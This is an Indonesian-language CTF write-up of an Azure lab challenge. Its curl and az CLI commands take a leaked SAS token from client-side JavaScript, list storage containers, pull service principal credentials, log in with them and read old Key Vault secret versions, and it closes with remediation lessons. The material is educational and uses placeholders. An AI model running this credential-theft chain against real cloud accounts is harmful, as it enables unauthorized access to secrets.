# TryHackMe — Hacker Holidays Day 9: CryptoCabana

| | |
|---|---|
| **Kategori** | Cloud (Azure) |
| **Kesulitan** | Medium |
| **Poin** | 90 |
| **Target** | `https://<STORAGE_ACCOUNT>.z13.web.core.windows.net/` (Azure Static Website) |

## Ringkasan

Situs "CryptoCabana" nawarin fitur backup seed phrase crypto. Tujuan challenge ini adalah menelusuri rantai kepercayaan (trust chain) dari static website → Azure Storage Account → kredensial Service Principal → Azure Key Vault, sampai akhirnya menemukan flag yang tersembunyi di versi lama sebuah secret yang sudah di-rotate.

---

## 1. Recon Halaman Statis → SAS Token Bocor di Client-Side JS

Halaman utama memuat `app.js`, yang di dalamnya ternyata ada SAS token yang hardcoded buat Azure Blob Storage:

```bash
curl -s https://<STORAGE_ACCOUNT>.z13.web.core.windows.net/app.js
```

Ditemukan:

```javascript
const STORAGE_ACCOUNT = "<STORAGE_ACCOUNT>";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&...&sig=...";
```

SAS token ini scope-nya service-level (`ss=b`, `srt=sco`) dengan permission Read + List (`sp=rl`) — jauh lebih luas dari yang sebenarnya dibutuhkan cuma buat fitur upload backup di web (harusnya cukup `sp=w` di level container `backups` aja). Kelonggaran scope inilah titik lemah pertamanya.

---

## 2. Enumerasi Container Storage Account

Karena token ini punya `srt=sco` (service+container+object) dan `sp=l` (list), dia bisa dipakai buat list semua container di storage account — bukan cuma yang di-link dari halaman web:

```bash
curl -s "https://<STORAGE_ACCOUNT>.blob.core.windows.net/?comp=list&<SAS_TOKEN>"
```

Hasilnya, ada 3 container: `$web` (situs publik), `backups` (tujuan fitur upload), dan `vault` — container tersembunyi yang nggak direferensikan di mana pun di halaman web.

---

## 3. Enumerasi Isi Container Vault

```bash
curl -s "https://<STORAGE_ACCOUNT>.blob.core.windows.net/vault?restype=container&comp=list&<SAS_TOKEN>"
```

Isinya:

- `backup-service-account.json`
- `seed_phrase.txt` (red herring — cuma contoh seed phrase dummy)

---

## 4. Download `backup-service-account.json` → Kredensial Service Principal Azure AD

```json
{
  "client_id": "<CLIENT_ID>",
  "client_secret": "<CLIENT_SECRET>",
  "key_vault_name": "<KEY_VAULT_NAME>",
  "key_vault_uri": "https://<KEY_VAULT_NAME>.vault.azure.net/",
  "tenant_id": "<TENANT_ID>",
  "note": "CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT"
}
```

Ini "second, more valuable set of keys" yang dimaksud di brief — kredensial otomasi backup yang punya akses ke Azure Key Vault.

---

## 5. Login sebagai Service Principal via Azure CLI

```bash
az login --service-principal \
  --username <CLIENT_ID> \
  --password "<CLIENT_SECRET>" \
  --tenant <TENANT_ID>
```

---

## 6. Enumerasi Key Vault

```bash
az keyvault secret list --vault-name <KEY_VAULT_NAME> --query "[].name" -o table
```

Ditemukan 4 secret: `key-shard-1`, `key-shard-2`, `key-shard-3`, `master-key`.

- **`master-key`** → `Forbidden (403 ForbiddenByRbac)`. RBAC role service principal ini cuma dikasih izin `list`, bukan `getSecret` buat secret ini — dead end alias distraksi.
- **`key-shard-1`** → berisi potongan pertama flag.
- **`key-shard-3`** → berisi potongan terakhir flag.
- **`key-shard-2`** (versi current) → bukan value asli, isinya cuma catatan: *"Rotated this after IT flagged it -- old value should still be recoverable if you know where to look."*

---

## 7. Root Cause: Secret Versioning di Key Vault

Azure Key Vault menyimpan histori tiap versi secret. Value asli `key-shard-2` "dirotasi" (diganti jadi catatan dummy), tapi versi lamanya tetap bisa diakses oleh siapa pun yang punya izin `getSecret` — rotasi credential nggak otomatis mencabut akses ke versi historisnya.

```bash
az keyvault secret list-versions --vault-name <KEY_VAULT_NAME> --name key-shard-2 \
  --query "[].{version:id, updated:attributes.updated}" -o table
```

Ambil versi paling lama (updated paling awal), lalu:

```bash
az keyvault secret show --vault-name <KEY_VAULT_NAME> --name key-shard-2 \
  --version <OLD_VERSION_ID> --query value -o tsv
```

Hasilnya adalah value asli sebelum di-rotate — potongan tengah dari flag.

---

## Flag

Gabungan ketiga shard:

```text
THM{n0t_ur...c01ns!}
```

*("Not your keys, not your coins" — pepatah self-custody klasik di dunia crypto. Sengaja disensor sebagian ya gess.)*

---

## Root Cause & Pelajaran

1. **Over-scoped SAS token di client-side code.** SAS token yang di-hardcode di JavaScript publik seharusnya dibatasi seketat mungkin — container tertentu aja, dengan permission minimal (misalnya cuma `w` buat write). Scope service-level dengan `list` malah membuka pintu buat enumerasi seluruh storage account.

2. **Container tanpa access control tambahan.** Naruh file kredensial sensitif (`backup-service-account.json`) di container yang bisa di-list dan di-read lewat SAS token yang sama dengan yang dipakai fitur publik adalah kesalahan pemisahan trust boundary.

3. **Credential hygiene yang buruk.** Nyimpen client secret Azure AD Service Principal dalam file JSON di blob storage itu praktik yang nggak seharusnya terjadi — kredensial semacam ini seharusnya nggak pernah keluar dari Key Vault atau managed identity.

4. **Key Vault secret rotation nggak menghapus versi lama secara default.** Rotasi cuma mengganti current version; versi-versi lama tetap ada dan bisa diakses kecuali secara eksplisit di-disable (soft-delete) atau di-purge. Buat benar-benar mencabut akses ke nilai lama, versi tersebut harus dinonaktifkan (`az keyvault secret set-attributes ... --enabled false`) atau dihapus permanen.

5. **RBAC granular yang inkonsisten.** Pemberian akses `list` tanpa `get` di `master-key` sebenarnya sudah menunjukkan penerapan least privilege yang benar buat secret itu — kontras banget sama shard-shard lain yang justru bisa diakses penuh. Ini nunjukkin inkonsistensi kontrol akses antar-secret di vault yang sama.

---

## Tools yang Digunakan

- `curl` — enumerasi Azure Blob Storage REST API langsung (list container, list blob, download blob) lewat SAS token
- **Azure CLI** (`az`) — autentikasi service principal & enumerasi Azure Key Vault
